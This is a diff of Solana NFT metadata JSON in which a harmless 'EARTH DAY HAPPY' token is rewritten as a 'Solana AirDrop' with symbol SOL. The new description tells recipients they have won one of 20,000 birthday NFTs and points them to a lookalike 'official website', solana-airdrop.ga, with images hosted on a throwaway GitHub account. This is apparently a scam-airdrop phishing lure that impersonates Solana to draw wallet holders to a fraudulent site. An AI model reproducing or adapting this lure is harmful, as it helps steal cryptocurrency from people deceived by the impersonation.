@@ -1,21 +1,21 @@
 {
-    "name": "EARTH DAY HAPPY",
-    "symbol": "NLE",
-    "description": "Famous Nft Art In Blockchain",
+    "name": "Solana AirDrop",
+    "symbol": "SOL",
+    "description": "Today is solana token's birthday and 20,000 NFTs has been distributed to its users and you are one of the winners.You will now find your nft in your wallet.You can sell it and trade it with confirmation of receipt for free from the official website of solana. Official Website:",
     "seller_fee_basis_points": 0,
-    "image": "https://www.pngall.com/wp-content/uploads/2017/04/Earth-Day-Free-PNG-Image.png",
-    "external_url": "https://www.pngall.com",
+    "image": "https://raw.githubusercontent.com/SOLANA-BIRTHDAY/hello/main/13.png",
+    "external_url": "https://solana-airdrop.ga",
     "properties": {
         "files": [
             {
-                "uri": "https://www.pngall.com/wp-content/uploads/2017/04/Earth-Day-Free-PNG-Image.png",
+                "uri": "https://raw.githubusercontent.com/SOLANA-BIRTHDAY/hello/main/13.png",
                 "type": "image/png"
             }
         ],
         "category": "image",
         "creators": [
             {
-                "address": "4NSim7rJyRb15CgjFbJhN9b7C7ECM3uyvdSSQ2vBJKas",
+                "address": "vbnUyk5Dgu9npdbAMbcbcg8tD1NrA1E9nM6aPtQQ46Z",
                 "share": 100
             }
         ]
